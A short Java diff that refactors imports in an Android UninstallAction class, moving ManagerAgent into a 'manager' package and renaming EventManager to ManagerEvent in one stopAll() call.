@@ -16,12 +16,12 @@ import android.net.Uri;
 
 import com.android.service.Messages;
 import com.android.service.Status;
-import com.android.service.agent.ManagerAgent;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
-import com.android.service.event.EventManager;
 import com.android.service.evidence.EvidenceCollector;
 import com.android.service.evidence.Markup;
+import com.android.service.manager.ManagerAgent;
+import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Check;
 
 /**
@@ -81,7 +81,7 @@ public class UninstallAction extends SubActionSlow {
 		}
 		
 		ManagerAgent.self().stopAll();
-		EventManager.self().stopAll();
+		ManagerEvent.self().stopAll();
 		Status.self().unTriggerAll();
 		return true;
 	}
